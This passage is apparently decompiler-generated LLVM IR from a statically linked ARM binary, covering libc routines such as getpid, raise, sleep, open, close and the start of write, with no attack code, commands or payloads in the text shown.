  %v0_15498 = phi i32 [ %v0_15494, %dec_label_pc_15494 ], [ %v2_1547429, %dec_label_pc_15468 ], [ %v2_15474, %dec_label_pc_15480.dec_label_pc_15474_crit_edge ]
  %v1_15498 = phi i32 [ %v0_15494, %dec_label_pc_15494 ], [ 0, %dec_label_pc_15468 ], [ %v1_15478.pre, %dec_label_pc_15480.dec_label_pc_15474_crit_edge ]
  %v3_15498 = icmp uge i32 %v0_15498, %v1_15498
  store i1 %v3_15498, i1* %cpsr_c.global-to-local, align 1
  %v9_15498 = icmp eq i32 %v0_15498, %v1_15498
  br i1 %v9_15498, label %dec_label_pc_154a0, label %dec_label_pc_15498.dec_label_pc_15418_crit_edge

dec_label_pc_15498.dec_label_pc_15418_crit_edge:  ; preds = %dec_label_pc_15498
  %v0_1541c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15418

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15498
  %v2_154a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_154a0, i32* %r4.global-to-local, align 4
  %v1_154a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_154a4

; uselistorder directives
  uselistorder i32 %v0_15494, { 1, 0 }
  uselistorder i32 %v1_15478.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15428.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1542418, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5 }
  uselistorder i32 126, { 8, 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_15498, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15480, { 1, 0 }
  uselistorder label %dec_label_pc_15468, { 1, 0 }
  uselistorder label %dec_label_pc_15448, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15430, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154a8 = load i32, i32* @r7, align 4
  store i32 %v3_154a8, i32* %stack_var_-8, align 4
  %v0_154ac = call i32 @__aeabi_read_tp()
  store i32 %v0_154ac, i32* %r0.global-to-local, align 4
  %v1_154b0 = add i32 %v0_154ac, -1060
  %v2_154b0 = inttoptr i32 %v1_154b0 to i32*
  %v3_154b0 = load i32, i32* %v2_154b0, align 4
  %tmp7 = icmp slt i32 %v3_154b0, 1
  br i1 %tmp7, label %dec_label_pc_154c0, label %dec_label_pc_154e4

dec_label_pc_154c0:                               ; preds = %entry
  %v2_154b4 = icmp eq i32 %v3_154b0, 0
  br i1 %v2_154b4, label %dec_label_pc_154c4, label %dec_label_pc_154d0

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154c0
  %v1_154c4 = add i32 %v0_154ac, -1064
  %v2_154c4 = inttoptr i32 %v1_154c4 to i32*
  %v3_154c4 = load i32, i32* %v2_154c4, align 4
  store i32 %v3_154c4, i32* %r0.global-to-local, align 4
  %v2_154c8 = icmp eq i32 %v3_154c4, 0
  br i1 %v2_154c8, label %bb, label %bb8

dec_label_pc_154d0:                               ; preds = %dec_label_pc_154c0
  br label %bb8

bb:                                               ; preds = %dec_label_pc_154c4
  store i32 0, i32* %v2_154c4, align 4
  %v0_154e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_154d0, %dec_label_pc_154c4, %bb
  %v0_154e0 = phi i32 [ %v3_154c4, %dec_label_pc_154c4 ], [ %v0_154ac, %dec_label_pc_154d0 ], [ %v0_154e0.pre, %bb ]
  br label %dec_label_pc_154e4

dec_label_pc_154e4:                               ; preds = %entry, %bb8
  %v0_154e4 = phi i32 [ %v3_154b0, %entry ], [ %v0_154e0, %bb8 ]
  store i32 %v0_154e4, i32* %r0.global-to-local, align 4
  %v2_154e8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_154e8, i32* @r7, align 4
  ret i32 %v0_154e4

; uselistorder directives
  uselistorder i32 %v0_154e4, { 1, 0 }
  uselistorder i32 %v3_154b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_154e4, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_154f0 = load i32, i32* @r4, align 4
  store i32 %v3_154f0, i32* %stack_var_-20, align 4
  %v0_154f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_154f8, i32* %r0.global-to-local, align 4
  %v1_154fc = add i32 %v0_154f8, -1064
  %v2_154fc = inttoptr i32 %v1_154fc to i32*
  %v3_154fc = load i32, i32* %v2_154fc, align 4
  store i32 %v3_154fc, i32* %r4.global-to-local, align 4
  %v2_15500 = icmp eq i32 %v3_154fc, 0
  %v1_15508 = add i32 %v0_154f8, -1060
  %v2_15508 = inttoptr i32 %v1_15508 to i32*
  %v3_15508 = load i32, i32* %v2_15508, align 4
  store i32 %v3_15508, i32* %r0.global-to-local, align 4
  br i1 %v2_15500, label %dec_label_pc_15510, label %dec_label_pc_15524

dec_label_pc_15510:                               ; preds = %entry
  store i32 %v3_15508, i32* %r4.global-to-local, align 4
  store i32 %v3_15508, i32* %v2_154fc, align 4
  %v0_1554c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_15524:                               ; preds = %entry
  %v5_15528 = icmp sgt i32 %v3_15508, 0
  br i1 %v5_15528, label %bb28, label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15524
  %tmp = bitcast i32 %v3_15508 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1552c = bitcast float %tmp30 to i32
  %v2_15530 = icmp eq i32 %v1_1552c, 0
  br i1 %v2_15530, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1552c
  store i32 %v3_154fc, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1552c
  %v2_15538 = sub i32 0, %v3_15508
  store i32 %v2_15538, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_15524, %dec_label_pc_15510, %.thread
  %v0_15550 = phi i32 [ %v3_15508, %dec_label_pc_15524 ], [ %v0_1554c.pre, %dec_label_pc_15510 ], [ %v3_154fc, %bb ], [ %v2_15538, %.thread ]
  store i32 %v0_15550, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_15550, -4095
  br i1 %tmp31, label %dec_label_pc_15574, label %dec_label_pc_1555c

dec_label_pc_1555c:                               ; preds = %bb28
  %v0_15560 = call i32 @__aeabi_read_tp()
  %v3_15564 = load i16, i16* @global_var_23424.488, align 2
  %v4_15564 = sext i16 %v3_15564 to i32
  %v0_15568 = load i32, i32* %r2.global-to-local, align 4
  %v1_15568 = sub i32 0, %v0_15568
  store i32 %v1_15568, i32* %r2.global-to-local, align 4
  %v3_1556c = add i32 %v4_15564, %v0_15560
  %v4_1556c = inttoptr i32 %v3_1556c to i32*
  store i32 %v1_15568, i32* %v4_1556c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15574

dec_label_pc_15574:                               ; preds = %bb28, %dec_label_pc_1555c
  %v0_15578 = phi i32 [ %v0_15550, %bb28 ], [ -1, %dec_label_pc_1555c ]
  %v3_15574 = icmp eq i32 %v0_15578, -1
  store i32 %v0_15578, i32* %r5.global-to-local, align 4
  br i1 %v3_15574, label %dec_label_pc_15580, label %dec_label_pc_155c8

dec_label_pc_15580:                               ; preds = %dec_label_pc_15574
  %v0_15584 = call i32 @__aeabi_read_tp()
  store i32 %v0_15584, i32* %r0.global-to-local, align 4
  %v3_15588 = load i16, i16* @global_var_23424.488, align 2
  %v4_15588 = sext i16 %v3_15588 to i32
  %v2_1558c = add i32 %v4_15588, %v0_15584
  %v3_1558c = inttoptr i32 %v2_1558c to i32*
  %v4_1558c = load i32, i32* %v3_1558c, align 4
  %v7_15590 = icmp eq i32 %v4_1558c, 38
  br i1 %v7_15590, label %dec_label_pc_1559c, label %dec_label_pc_15580.dec_label_pc_155c8_crit_edge

dec_label_pc_15580.dec_label_pc_155c8_crit_edge:  ; preds = %dec_label_pc_15580
  %v0_155c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155c8

dec_label_pc_1559c:                               ; preds = %dec_label_pc_15580
  %v0_1559c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1559c, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_1559c, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_1559c
  %v5_155b4 = sub i32 0, %v0_1559c
  store i32 %v5_155b4, i32* %r2.global-to-local, align 4
  %v7_155b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_155c0.669 to i32), i32 56932) to i32*), align 4
  %v4_155bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_155bc, i32* %r0.global-to-local, align 4
  %v7_155c0 = add i32 %v7_155b8, %v0_15584
  %v8_155c0 = inttoptr i32 %v7_155c0 to i32*
  store i32 %v5_155b4, i32* %v8_155c0, align 4
  %v0_155c4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_1559c, %bb29
  %v0_155c4 = phi i32 [ %v0_155c4.pre, %bb29 ], [ %v0_1559c, %dec_label_pc_1559c ]
  store i32 %v0_155c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %dec_label_pc_15580.dec_label_pc_155c8_crit_edge, %dec_label_pc_15574, %.thread22
  %v0_155c8 = phi i32 [ %v0_155c8.pre, %dec_label_pc_15580.dec_label_pc_155c8_crit_edge ], [ %v0_15578, %dec_label_pc_15574 ], [ %v0_155c4, %.thread22 ]
  store i32 %v0_155c8, i32* %r0.global-to-local, align 4
  %v2_155cc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_155cc, i32* @r4, align 4
  ret i32 %v0_155c8

; uselistorder directives
  uselistorder i32 %v0_155c8, { 1, 0 }
  uselistorder i32 %v0_1559c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15550, { 2, 0, 1 }
  uselistorder i32 %v3_15508, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 11, 3, 0, 4, 1, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_155c8, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_15574, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_155e0 = load i32, i32* @r4, align 4
  %v6_155e0 = load i32, i32* @r5, align 4
  %v9_155e0 = load i32, i32* @r6, align 4
  %v12_155e0 = load i32, i32* @r7, align 4
  %v15_155e0 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_155f0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_155f0, label %dec_label_pc_15604, label %dec_label_pc_15678

dec_label_pc_15604:                               ; preds = %entry
  %v0_15604 = call i32 @__aeabi_read_tp()
  %v1_15608 = add i32 %v0_15604, -1036
  %v2_15608 = inttoptr i32 %v1_15608 to i32*
  %v3_15608 = load i32, i32* %v2_15608, align 4
  %v1_1560c = and i32 %v3_15608, -71
  %v2_15610 = icmp ugt i32 %v1_1560c, 7
  store i1 %v2_15610, i1* %cpsr_c.global-to-local, align 1
  %v7_15610 = icmp eq i32 %v1_1560c, 8
  %v1_15614 = add i32 %v0_15604, -1168
  store i32 %v1_15614, i32* @r5, align 4
  br i1 %v7_15610, label %dec_label_pc_1561c, label %dec_label_pc_156f0

dec_label_pc_1561c:                               ; preds = %dec_label_pc_15604
  %v2_15620 = add i32 %v0_15604, -624
  %v3_15620 = inttoptr i32 %v2_15620 to i32*
  store i32 -1, i32* %v3_15620, align 4
  %v0_15624 = load i32, i32* @r5, align 4
  %v1_15624 = add i32 %v0_15624, 132
  store i32 %v1_15624, i32* @r6, align 4
  br label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_1565c.dec_label_pc_15628_crit_edge, %dec_label_pc_1561c
  %v0_1562c = phi i32 [ %v0_1562c.pre, %dec_label_pc_1565c.dec_label_pc_15628_crit_edge ], [ %v1_15624, %dec_label_pc_1561c ]
  %v0_15628 = phi i32 [ %v0_15664, %dec_label_pc_1565c.dec_label_pc_15628_crit_edge ], [ %v0_15624, %dec_label_pc_1561c ]
  %v1_15628 = add i32 %v0_15628, 132
  %v2_15628 = inttoptr i32 %v1_15628 to i32*
  %v3_15628 = load i32, i32* %v2_15628, align 4
  store i32 %v0_1562c, i32* %r2.global-to-local, align 4
  store i32 %v3_15628, i32* @r4, align 4
  %v1_1563830 = inttoptr i32 %v0_1562c to i32*
  %v2_1563831 = load i32, i32* %v1_1563830, align 4
  %v3_1563c33 = icmp uge i32 %v2_1563831, %v3_15628
  store i1 %v3_1563c33, i1* %cpsr_c.global-to-local, align 1
  %v9_1563c39 = icmp eq i32 %v2_1563831, %v3_15628
  br i1 %v9_1563c39, label %dec_label_pc_15644, label %dec_label_pc_1565c

dec_label_pc_15644:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15644.dec_label_pc_15638_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15654 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15654, label %dec_label_pc_15658, label %dec_label_pc_15644.dec_label_pc_15638_crit_edge

dec_label_pc_15644.dec_label_pc_15638_crit_edge:  ; preds = %dec_label_pc_15644
  %v0_15638.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1563c.pre = load i32, i32* @r4, align 4
  %v1_15638 = inttoptr i32 %v0_15638.pre to i32*
  %v2_15638 = load i32, i32* %v1_15638, align 4
  %v3_1563c = icmp uge i32 %v2_15638, %v1_1563c.pre
  store i1 %v3_1563c, i1* %cpsr_c.global-to-local, align 1
  %v9_1563c = icmp eq i32 %v2_15638, %v1_1563c.pre
  br i1 %v9_1563c, label %dec_label_pc_15644, label %dec_label_pc_1565c

dec_label_pc_15658:                               ; preds = %dec_label_pc_15644
  %v0_15658 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1565c

dec_label_pc_1565c:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15644.dec_label_pc_15638_crit_edge, %dec_label_pc_15658
  %v0_1565c = phi i32 [ %v0_15658, %dec_label_pc_15658 ], [ %v2_1563831, %dec_label_pc_15628 ], [ %v2_15638, %dec_label_pc_15644.dec_label_pc_15638_crit_edge ]
  %v1_1565c = phi i32 [ %v0_15658, %dec_label_pc_15658 ], [ %v3_15628, %dec_label_pc_15628 ], [ %v1_1563c.pre, %dec_label_pc_15644.dec_label_pc_15638_crit_edge ]
  %v3_1565c = icmp uge i32 %v0_1565c, %v1_1565c
  store i1 %v3_1565c, i1* %cpsr_c.global-to-local, align 1
  %v9_1565c = icmp eq i32 %v0_1565c, %v1_1565c
  br i1 %v9_1565c, label %dec_label_pc_15664, label %dec_label_pc_1565c.dec_label_pc_15628_crit_edge

dec_label_pc_1565c.dec_label_pc_15628_crit_edge:  ; preds = %dec_label_pc_1565c
  %v0_15664 = load i32, i32* @r5, align 4
  %v0_1562c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15628

dec_label_pc_15664:                               ; preds = %dec_label_pc_1565c
  %v0_1566c = load i32, i32* @r7, align 4
  %v2_1566c = add i32 %v0_1566c, 116
  %v3_1566c = inttoptr i32 %v2_1566c to i32*
  %v4_1566c = load i32, i32* %v3_1566c, align 4
  store i32 87672, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1566c)
  %v0_15680.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15678

dec_label_pc_15678:                               ; preds = %entry, %dec_label_pc_15664
  %v0_15680 = phi i32 [ 0, %entry ], [ %v0_15680.pre, %dec_label_pc_15664 ]
  %v2_15684 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_15684, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %stack_var_-40, align 4
  %v3_15690 = call i32 @__libc_sigaction(i32 17, i32 %v0_15680, i32 %v2_15684)
  %v3_15694 = load i32, i32* %stack_var_-60, align 4
  %v2_15698 = icmp ne i32 %v3_15694, 0
  store i1 %v2_15698, i1* %cpsr_c.global-to-local, align 1
  %v7_15698 = icmp eq i32 %v3_15694, 1
  br i1 %v7_15698, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15678
  %v3_1569c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1569c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15678, %bb
  call void @__pseudo_cond_branch(i1 %v7_15698, i32 ptrtoint (i32* @global_var_12554.673 to i32))
  %v2_156ac = ptrtoint i32* %stack_var_-32 to i32
  %v2_156b4 = call i32 @__libc_nanosleep(i32 %v2_156ac, i32 %v2_156ac)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_156b8 = icmp eq i32 %v2_156b4, 0
  br i1 %v2_156b8, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_156cc = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_156cc, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_156dc = load i32, i32* %stack_var_-40, align 4
  %v1_156e0 = and i32 %v3_156dc, ptrtoint (i32* @global_var_10000.35 to i32)
  store i32 %v1_156e0, i32* %r2.global-to-local, align 4
  %v2_156e0 = icmp eq i32 %v1_156e0, 0
  br i1 %v2_156e0, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_156e8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_156e8, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_156e0, i32 ptrtoint (i32* @global_var_12554.673 to i32))
  br label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %dec_label_pc_15604, %.thread5
  %v0_156f0 = load i32, i32* @r4, align 4
  store i32 %v3_155e0, i32* @r4, align 4
  store i32 %v6_155e0, i32* @r5, align 4
  store i32 %v9_155e0, i32* @r6, align 4
  store i32 %v12_155e0, i32* @r7, align 4
  store i32 %v15_155e0, i32* @lr, align 4
  ret i32 %v0_156f0

; uselistorder directives
  uselistorder i32 %v0_15658, { 1, 0 }
  uselistorder i32 %v1_1563c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.35 to i32), { 4, 0, 1, 2, 5, 6, 7, 3 }
  uselistorder label %dec_label_pc_156f0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15678, { 1, 0 }
  uselistorder label %dec_label_pc_1565c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15644, { 1, 0 }
}

define i32 @function_15704(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15704:
  %v0_15704 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15704, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15704
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15704, %bb
  %v3_15710 = phi i32 [ %arg1, %dec_label_pc_15704 ], [ 0, %bb ]
  ret i32 %v3_15710

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_15724 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15724, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15724 = load i32, i32* @r0, align 4
  ret i32 %v2_15724

bb1:                                              ; preds = %entry
  %v0_15728 = call i32 @__syscall_error()
  ret i32 %v0_15728
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15734 = load i32, i32* @global_var_266b4.676, align 4
  %v2_15738 = icmp eq i32 %v3_15734, 0
  store i1 %v2_15738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15738, label %dec_label_pc_15740, label %entry.dec_label_pc_1575c_crit_edge

entry.dec_label_pc_1575c_crit_edge:               ; preds = %entry
  %v3_1575c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1575c

dec_label_pc_15740:                               ; preds = %entry
  %v0_15740 = load i32, i32* @r7, align 4
  store i32 %v0_15740, i32* @ip, align 4
  %v0_15750 = load i32, i32* @r0, align 4
  %v2_15750 = icmp ugt i32 %v0_15750, -4097
  %v7_15750 = icmp eq i32 %v0_15750, -4096
  store i1 %v7_15750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15750, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_1575c, %dec_label_pc_15740
  %merge = phi i32 [ %v0_15750, %dec_label_pc_15740 ], [ %v0_15780, %dec_label_pc_1575c ], [ %v0_15790, %bb8 ], [ %v8_157a0, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_15740
  %v0_15758 = call i32 @__syscall_error()
  br label %dec_label_pc_1575c

dec_label_pc_1575c:                               ; preds = %entry.dec_label_pc_1575c_crit_edge, %bb7
  %v3_1575c = phi i32 [ %v3_1575c.pre, %entry.dec_label_pc_1575c_crit_edge ], [ %v0_15758, %bb7 ]
  %v9_1575c = load i32, i32* @r7, align 4
  store i32 %v9_1575c, i32* %stack_var_-8, align 4
  %v12_1575c = load i32, i32* @lr, align 4
  %v0_15760 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_15760, i32* @ip, align 4
  store i32 %v3_1575c, i32* @r7, align 4
  %v1_1577c = call i32 @__libc_disable_asynccancel(i32 %v0_15760)
  %v0_15780 = load i32, i32* @r7, align 4
  store i32 %v0_15780, i32* @r0, align 4
  %v2_15784 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15784, i32* @r7, align 4
  store i32 %v12_1575c, i32* @lr, align 4
  %v2_15788 = icmp ugt i32 %v0_15780, -4097
  %v7_15788 = icmp eq i32 %v0_15780, -4096
  store i1 %v7_15788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15788, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1575c
  %v0_15790 = call i32 @__syscall_error()
  %v0_157a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_157a0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_157a0 = load i32, i32* @r1, align 4
  %v2_157a0 = load i32, i32* @r8, align 4
  %v3_157a0 = udiv i32 %v2_157a0, 536870912
  %v4_157a0 = mul i32 %v2_157a0, 8
  %v5_157a0 = or i32 %v3_157a0, %v4_157a0
  %v8_157a0 = and i32 %v5_157a0, %v1_157a0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15780, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15750, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1575c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_157b4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_157b4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_157b4 = load i32, i32* @r0, align 4
  ret i32 %v2_157b4

bb1:                                              ; preds = %entry
  %v0_157b8 = call i32 @__syscall_error()
  ret i32 %v0_157b8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_157c4 = load i32, i32* @global_var_266b4.676, align 4
  %v2_157c8 = icmp eq i32 %v3_157c4, 0
  store i1 %v2_157c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157c8, label %dec_label_pc_157d0, label %entry.dec_label_pc_157ec_crit_edge

entry.dec_label_pc_157ec_crit_edge:               ; preds = %entry
  %v3_157ec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_157ec

dec_label_pc_157d0:                               ; preds = %entry
  %v0_157e0 = load i32, i32* @r0, align 4
  %v2_157e0 = icmp ugt i32 %v0_157e0, -4097
  %v7_157e0 = icmp eq i32 %v0_157e0, -4096
  store i1 %v7_157e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157e0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_157ec, %dec_label_pc_157d0
  %merge = phi i32 [ %v0_157e0, %dec_label_pc_157d0 ], [ %v0_15810, %dec_label_pc_157ec ], [ %v0_15820, %bb10 ], [ %v9_15830, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_157d0
  %v0_157e8 = call i32 @__syscall_error()
  br label %dec_label_pc_157ec

dec_label_pc_157ec:                               ; preds = %entry.dec_label_pc_157ec_crit_edge, %bb9
  %v3_157ec = phi i32 [ %v3_157ec.pre, %entry.dec_label_pc_157ec_crit_edge ], [ %v0_157e8, %bb9 ]
  store i32 %v3_157ec, i32* %stack_var_-24, align 4
  %v9_157ec = load i32, i32* @r2, align 4
  %v12_157ec = load i32, i32* @r3, align 4
  %v15_157ec = load i32, i32* @r7, align 4
  store i32 %v15_157ec, i32* %stack_var_-8, align 4
  %v18_157ec = load i32, i32* @lr, align 4
  %v0_157f0 = call i32 @__libc_enable_asynccancel()
  %v2_157f8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_157ec, i32* @r2, align 4
  store i32 %v12_157ec, i32* @r3, align 4
  store i32 %v2_157f8, i32* @r7, align 4
  %v1_1580c = call i32 @__libc_disable_asynccancel(i32 %v0_157f0)
  %v0_15810 = load i32, i32* @r7, align 4
  store i32 %v0_15810, i32* @r0, align 4
  %v2_15814 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15814, i32* @r7, align 4
  store i32 %v18_157ec, i32* @lr, align 4
  %v2_15818 = icmp ugt i32 %v0_15810, -4097
  %v7_15818 = icmp eq i32 %v0_15810, -4096
  store i1 %v7_15818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15818, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_157ec
  %v0_15820 = call i32 @__syscall_error()
  %v0_15830 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15830, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_15830 = load i32, i32* @r1, align 4
  %v2_15830 = load i32, i32* @r8, align 4
  %v3_15830 = load i32, i32* @lr, align 4
  %v8_15830 = ashr i32 %v2_15830, %v3_15830
  %v9_15830 = and i32 %v8_15830, %v1_15830
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15810, { 0, 2, 3, 1 }
  uselistorder i32 %v0_157e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_157ec, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_15844 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15844, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15844 = load i32, i32* @r0, align 4
  ret i32 %v2_15844

bb1:                                              ; preds = %entry
  %v0_15848 = call i32 @__syscall_error()
  ret i32 %v0_15848
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15854 = load i32, i32* @global_var_266b4.676, align 4
  %v2_15858 = icmp eq i32 %v3_15854, 0
  store i1 %v2_15858, i1* %cpsr_z.global-to-local, align 1
